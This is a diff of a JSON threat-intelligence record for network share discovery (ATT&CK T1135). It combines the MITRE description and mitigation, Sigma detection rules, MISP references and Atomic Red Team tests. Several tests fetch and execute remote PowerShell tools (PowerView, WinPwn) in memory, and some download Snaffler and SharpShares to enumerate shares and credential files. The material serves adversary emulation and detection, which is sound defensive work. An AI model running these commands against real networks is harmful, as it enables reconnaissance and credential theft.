+                            "uuid": "5ee3822c-6828-418c-b619-62de950d210f",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "3489cfc5-640f-4bb3-a103-9137b97de79f",
+                        "lookup_data": {
+                            "capec": "CAPEC-643",
+                            "mitre-attack-id": "T1135",
+                            "mitre-cti:description": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.",
+                            "mitre-cti:name": "Network Share Discovery",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['macOS', 'Windows', 'Linux'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Praetorian'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f', 'type': 'attack-pattern', 'created': '2017-12-14T16:46:06.044Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1135', 'url': 'https://attack.mitre.org/techniques/T1135'}, {'external_id': 'CAPEC-643', 'source_name': 'capec', 'url': 'https://capec.mitre.org/data/definitions/643.html'}, {'url': 'https://en.wikipedia.org/wiki/Shared_resource', 'description': 'Wikipedia. (2017, April 15). Shared resource. Retrieved June 30, 2017.', 'source_name': 'Wikipedia Shared Resource'}, {'url': 'https://technet.microsoft.com/library/cc770880.aspx', 'description': 'Microsoft. (n.d.). Share a Folder or Drive. Retrieved June 30, 2017.', 'source_name': 'TechNet Shared Folder'}], 'modified': '2021-10-13T18:10:57.185Z', 'name': 'Network Share Discovery', 'description': 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \\n\\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\\\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}], 'x_mitre_detection': 'System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).', 'x_mitre_version': '3.1', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Command: Command Execution', 'Process: Process Creation', 'Process: OS API Execution'], 'x_mitre_permissions_required': ['User'], 'x_mitre_is_subtechnique': False}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "bef37fa2-f205-4a7b-b484-0759bfd5f86f",
+                        "lookup_data": {
+                            "description": "Detects the use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups.",
+                            "raw": "author: '@ROxPinTeddy, Nasreddine Bencherchali'\ndate: 2020/05/12\ndescription: Detects the use of Advanced IP Scanner. Seems to be a popular tool for\n  ransomware groups.\ndetection:\n  condition: 1 of selection*\n  selection1:\n  - Image|contains: \\advanced_ip_scanner\n  - OriginalFileName|contains: advanced_ip_scanner\n  - Description|contains: Advanced IP Scanner\n  selection2:\n    CommandLine|contains|all:\n    - /portable\n    - /lng\nfalsepositives:\n- Legitimate administrative use\nid: bef37fa2-f205-4a7b-b484-0759bfd5f86f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/11\nreferences:\n- https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/\n- https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html\n- https://labs.f-secure.com/blog/prelude-to-ransomware-systembc\n- https://assets.documentcloud.org/documents/20444693/fbi-pin-egregor-ransomware-bc-01062021.pdf\n- https://thedfirreport.com/2021/01/18/all-that-for-a-coinminer\n- https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20IP%20Scanner\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1046\n- attack.t1135\ntitle: Advanced IP Scanner\n",
+                            "sigma:id": "bef37fa2-f205-4a7b-b484-0759bfd5f86f",
+                            "title": "Advanced IP Scanner",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5e55be1a-3a30-48ae-9934-4199950d210f",
+                        "lookup_data": {
+                            "description": "Interesting Recon Script",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5e55be1a-3a30-48ae-9934-4199950d210f.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1582912038",
+                            "uuid": "5e55be1a-3a30-48ae-9934-4199950d210f",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "75925535-ca97-4e0a-a850-00b5c00779dc",
+                        "lookup_data": {
+                            "description": "Detects automated lateral movement by Turla group",
+                            "raw": "author: Markus Neis\ndate: 2017/11/07\ndescription: Detects automated lateral movement by Turla group\ndetection:\n  condition: netCommand1 | near netCommand2 and netCommand3\n  netCommand1:\n    CommandLine: net view /DOMAIN\n  netCommand2:\n    CommandLine: net session\n  netCommand3:\n    CommandLine: net share\n  timeframe: 1m\nfalsepositives:\n- Unknown\nid: 75925535-ca97-4e0a-a850-00b5c00779dc\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://securelist.com/the-epic-turla-operation/65545/\nstatus: test\ntags:\n- attack.g0010\n- attack.execution\n- attack.t1059\n- attack.lateral_movement\n- attack.t1021.002\n- attack.discovery\n- attack.t1083\n- attack.t1135\ntitle: Automated Turla Group Lateral Movement\n",
+                            "sigma:id": "75925535-ca97-4e0a-a850-00b5c00779dc",
+                            "title": "Automated Turla Group Lateral Movement",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5d6e7aa3-aca4-46cc-b96a-46ac950d210f",
+                        "lookup_data": {
+                            "description": "SectorJ04 Groupâ€™s Increased Activity in 2019",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5d6e7aa3-aca4-46cc-b96a-46ac950d210f.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1568039252",
+                            "uuid": "5d6e7aa3-aca4-46cc-b96a-46ac950d210f",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "83e15192-96d8-476c-aa39-0317de8dba80",
+                        "lookup_data": {
+                            "description": "OSINT - Uber Breach & Attack Analysis",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/83e15192-96d8-476c-aa39-0317de8dba80.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1666020853",
+                            "uuid": "83e15192-96d8-476c-aa39-0317de8dba80",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1f34230d-b6ae-4dc7-8599-78c18820bd21",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1135",
+                            "mitre-cti:description": "Identify unnecessary system utilities or potentially malicious software that may be used to acquire network share information, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",
+                            "mitre-cti:name": "Network Share Discovery Mitigation",
+                            "mitre-cti:type": "course-of-action",
+                            "raw": "{'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'course-of-action--1f34230d-b6ae-4dc7-8599-78c18820bd21', 'type': 'course-of-action', 'created': '2018-10-17T00:14:20.652Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'external_id': 'T1135', 'url': 'https://attack.mitre.org/mitigations/T1135', 'source_name': 'mitre-attack'}, {'source_name': 'Beechey 2010', 'description': 'Beechey, J. (2010, December). Application Whitelisting: Panacea or Propaganda?. Retrieved November 18, 2014.', 'url': 'http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599'}, {'url': 'http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html', 'description': 'Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016.', 'source_name': 'Windows Commands JPCERT'}, {'url': 'https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm', 'description': 'NSA Information Assurance Directorate. (2014, August). Application Whitelisting Using Microsoft AppLocker. Retrieved March 31, 2016.', 'source_name': 'NSA MS AppLocker'}, {'source_name': 'Corio 2008', 'description': 'Corio, C., & Sayana, D. P. (2008, June). Application Lockdown with Software Restriction Policies. Retrieved November 18, 2014.', 'url': 'http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx'}, {'source_name': 'TechNet Applocker vs SRP', 'description': 'Microsoft. (2012, June 27). Using Software Restriction Policies and AppLocker Policies. Retrieved April 7, 2016.', 'url': 'https://technet.microsoft.com/en-us/library/ee791851.aspx'}], 'modified': '2020-01-17T16:45:23.867Z', 'name': 'Network Share Discovery Mitigation', 'description': 'Identify unnecessary system utilities or potentially malicious software that may be used to acquire network share information, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)', 'x_mitre_deprecated': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e",
+                        "lookup_data": {
+                            "description": "Detects typical Dridex process patterns",
+                            "raw": "author: Florian Roth (Nextron Systems), oscd.community\ndate: 2019/01/10\ndescription: Detects typical Dridex process patterns\ndetection:\n  condition: selection1 or selection2 and (selection3 or selection4)\n  selection1:\n    CommandLine|contains|all:\n    - C:\\Users\\\n    - \\Desktop\\\n    Image|endswith: \\svchost.exe\n  selection2:\n    ParentImage|endswith: \\svchost.exe\n  selection3:\n    CommandLine|contains: all\n    Image|endswith: \\whoami.exe\n  selection4:\n    CommandLine|contains: view\n    Image|endswith:\n    - \\net.exe\n    - \\net1.exe\nfalsepositives:\n- Unlikely\nid: e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://app.any.run/tasks/993daa5e-112a-4ff6-8b5a-edbcec7c7ba3\nstatus: stable\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055\n- attack.discovery\n- attack.t1135\n- attack.t1033\ntitle: Dridex Process Pattern\n",
+                            "sigma:id": "e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e",
+                            "title": "Dridex Process Pattern",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5e78dc2c-afc8-411f-94a5-40bb950d210f",
+                        "lookup_data": {
+                            "description": "Trickbot to Ryuk in Two Hours",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5e78dc2c-afc8-411f-94a5-40bb950d210f.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1585237597",
+                            "uuid": "5e78dc2c-afc8-411f-94a5-40bb950d210f",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1135",
+                "display_name": "Network Share Discovery",
+                "atomic_tests": [
+                    {
+                        "name": "Network Share Discovery",
+                        "auto_generated_guid": "f94b5ad9-911c-4eff-9718-fd21899db4f7",
+                        "description": "Network Share Discovery\n",
+                        "supported_platforms": [
+                            "macos"
+                        ],
+                        "input_arguments": {
+                            "computer_name": {
+                                "description": "Computer name to find a mount on.",
+                                "type": "string",
+                                "default": "computer1"
+                            }
+                        },
+                        "executor": {
+                            "command": "df -aH\nsmbutil view -g //#{computer_name}\nshowmount #{computer_name}\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Network Share Discovery - linux",
+                        "auto_generated_guid": "875805bc-9e86-4e87-be86-3a5527315cae",
+                        "description": "Network Share Discovery using smbstatus\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "package_checker": {
+                                "description": "Package checking command. Debian - dpkg -s samba",
+                                "type": "string",
+                                "default": "(rpm -q samba &>/dev/null) || (dpkg -s samba | grep -q installed)"
+                            },
+                            "package_installer": {
+                                "description": "Package installer command. Debian - apt install samba",
+                                "type": "string",
+                                "default": "(which yum && yum -y install epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y samba)"
+                            }
+                        },
+                        "dependency_executor_name": "bash",
+                        "dependencies": [
+                            {
+                                "description": "Package with smbstatus (samba) must exist on device\n",
+                                "prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n",
+                                "get_prereq_command": "#{package_installer}\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "smbstatus --shares\n",
+                            "name": "bash",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Network Share Discovery - FreeBSD",
+                        "auto_generated_guid": "77e468a6-3e5c-45a1-9948-c4b5603747cb",
+                        "description": "Network Share Discovery using smbstatus\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "package_checker": {
+                                "description": "Package checking command. pkg info -x samba",
+                                "type": "string",
+                                "default": "(pkg info -x samba &>/dev/null)"
+                            },
+                            "package_installer": {
+                                "description": "Package installer command. pkg install -y samba413",
+                                "type": "string",
+                                "default": "(which pkg && pkg install -y samba413)"
+                            }
+                        },
+                        "dependency_executor_name": "sh",
+                        "dependencies": [
+                            {
+                                "description": "Package with smbstatus (samba) must exist on device\n",
+                                "prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n",
+                                "get_prereq_command": "#{package_installer} \n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "smbstatus --shares\n",
+                            "name": "sh",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Network Share Discovery command prompt",
+                        "auto_generated_guid": "20f1097d-81c1-405c-8380-32174d493bbb",
+                        "description": "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution avalaible network shares will be displayed in the powershell session\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "computer_name": {
+                                "description": "Computer name to find a mount on.",
+                                "type": "string",
+                                "default": "localhost"
+                            }
+                        },
+                        "executor": {
+                            "command": "net view \\\\#{computer_name}\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Network Share Discovery PowerShell",
+                        "auto_generated_guid": "1b0814d1-bb24-402d-9615-1b20c50733fb",
+                        "description": "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, avalaible network shares will be displayed in the powershell session\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "get-smbshare\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "View available share drives",
+                        "auto_generated_guid": "ab39a04f-0c93-4540-9ff2-83f862c385ae",
+                        "description": "View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "net share\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Share Discovery with PowerView",
+                        "auto_generated_guid": "b1636f0a-ba82-435c-b699-0d78794d8bfd",
+                        "description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Endpoint must be joined to domain\n",
+                                "prereq_command": "if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "\"Join system to domain\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "PowerView ShareFinder",
+                        "auto_generated_guid": "d07e4cc1-98ae-447e-9d31-36cb430d28c4",
+                        "description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "parameters": {
+                                "description": "ShareFinder parameter",
+                                "type": "string",
+                                "default": "-CheckShareAccess"
+                            }
+                        },
+                        "dependencies": [
+                            {
+                                "description": "Invoke-ShareFinder module must exist in %TEMP% directory",
+                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nInvoke-ShareFinder #{parameters}\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - shareenumeration",
+                        "auto_generated_guid": "987901d1-5b87-4558-a6d9-cffcabc638b8",
+                        "description": "Network share enumeration using the shareenumeration function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nshareenumeration -noninteractive -consoleoutput",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Network Share Discovery via dir command",
+                        "auto_generated_guid": "13daa2cf-195a-43df-a8bd-7dd5ffb607b5",
+                        "description": "Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip\nUpon execution avalaible network shares will be displayed in the commandline session\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "computer_ip": {
+                                "description": "Computer IP to find a mount on.",
+                                "type": "string",
+                                "default": "127.0.0.1"
+                            }
+                        },
+                        "executor": {
+                            "command": "dir \\\\#{computer_ip}\\c$\ndir \\\\#{computer_ip}\\admin$\ndir \\\\#{computer_ip}\\IPC$\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Enumerate All Network Shares with SharpShares",
+                        "auto_generated_guid": "d1fa2a69-b0a2-4e8a-9112-529b00c19a41",
+                        "description": "SharpShares is a command line tool that can be integrated with Cobalt Strike's execute-assembly module, allowing for the enumeration of network shares. \nThis technique has been utilized by various ransomware groups, including BianLian.\n[Reference](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-136a)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "output_path": {
+                                "description": "File to output enumeration results to",
+                                "type": "String",
+                                "default": "$env:temp\\T1135SharpSharesOutput.txt"
+                            },
+                            "sharp_path": {
+                                "description": "Path to the SharpShares executable",
+                                "type": "String",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\SharpShares.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "The SharpShares executable must exist on disk",
+                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpShares.exe\") {exit 0} else {exit 1}",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/mitchmoser/SharpShares/releases/download/v2.4/SharpShares.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpShares.exe\""
+                            }
+                        ],
+                        "executor": {
+                            "command": "cmd /c '#{sharp_path}' /ldap:all | out-file -filepath \"#{output_path}\"",
+                            "cleanup_command": "remove-item \"#{output_path}\" -force -erroraction silentlycontinue",
+                            "name": "powershell",
+                            "elevation_required": false
+                        }
+                    },
+                    {
+                        "name": "Enumerate All Network Shares with Snaffler",
+                        "auto_generated_guid": "b19d74b7-5e72-450a-8499-82e49e379d1a",
+                        "description": "Snaffler is an open-source tool that has been used by various threat groups, including Scattered Spider/Muddled Libra, to enumerate accessible shares and credential-containing files within a domain. \n[Reference](https://unit42.paloaltonetworks.com/muddled-libra/)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "output_path": {
+                                "description": "File to output enumeration results to",
+                                "type": "String",
+                                "default": "$env:temp\\T1135SnafflerOutput.txt"
+                            },
+                            "snaffler_path": {
+                                "description": "Path to the Snaffler executable",
+                                "type": "String",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\Snaffler.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "The Snaffler executable must exist on disk",
+                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Snaffler.exe\") {exit 0} else {exit 1}",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/SnaffCon/Snaffler/releases/download/1.0.150/Snaffler.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Snaffler.exe\""
+                            }
+                        ],
+                        "executor": {
+                            "command": "invoke-expression 'cmd /c start powershell -command { cmd /c \"#{snaffler_path}\" -a -o \"#{output_path}\" }; start-sleep 90; stop-process -name \"snaffler\"'\n",
+                            "cleanup_command": "remove-item \"#{output_path}\" -force -erroraction silentlycontinue",
+                            "name": "powershell",
+                            "elevation_required": false
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 13:29:02"
+}
